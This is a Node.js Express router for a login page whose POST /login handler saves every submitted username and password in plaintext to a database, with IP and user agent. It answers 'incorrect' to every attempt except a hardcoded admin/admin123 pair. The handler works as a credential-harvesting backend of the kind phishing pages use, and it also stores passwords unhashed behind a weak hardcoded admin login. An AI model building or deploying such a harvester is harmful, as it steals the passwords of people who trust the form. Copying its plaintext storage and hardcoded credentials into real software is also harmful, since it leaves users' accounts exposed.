const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const router = express.Router();

// PostgreSQL connection pool
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ── Hardcoded admin credentials ──
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'admin123';

// GET / – serve login page
router.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// GET /welcome – serve welcome page
router.get('/welcome', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'welcome.html'));
});

// POST /login
// Behaviour:
//   • ALWAYS saves the submitted username + password into the users table
//     (INSERT … ON CONFLICT DO NOTHING  →  new username is saved once)
//   • ALWAYS records the attempt in login_history
//   • SUCCESS only when username === 'admin' AND password === 'admin123'
//   • ALL other inputs → 401 "username or password incorrect" (no alternating)
router.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Basic input validation
  if (!username || !password) {
    return res.status(400).json({
      success: false,
      message: 'Username and password are required.'
    });
  }

  const ip_address =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    'unknown';
  const user_agent = req.headers['user-agent'] || 'unknown';

  try {
    // 1. Always save the submitted username + password to users table
    //    ON CONFLICT DO NOTHING preserves the first-seen password for that username.
    await pool.query(
      `INSERT INTO users (username, password)
       VALUES ($1, $2)
       ON CONFLICT (username) DO NOTHING`,
      [username, password]
    );

    // 2. Check if this is the admin credential
    const loginSuccess =
      username === ADMIN_USERNAME && password === ADMIN_PASSWORD;

    // 3. Record attempt in login_history
    await pool.query(
      `INSERT INTO login_history (username, success, ip_address, user_agent)
       VALUES ($1, $2, $3, $4)`,
      [username, loginSuccess ? 'true' : 'false', ip_address, user_agent]
    );

    // 4. Respond
    if (loginSuccess) {
      return res.json({
        success: true,
        message: `Welcome, ${username}!`,
        username
      });
    } else {
      return res.status(401).json({
        success: false,
        message: 'username or password incorrect'
      });
    }
  } catch (err) {
    console.error('DB Error:', err.message);
    return res.status(500).json({
      success: false,
      message: 'Server error. Please try again later.'
    });
  }
});

module.exports = router;
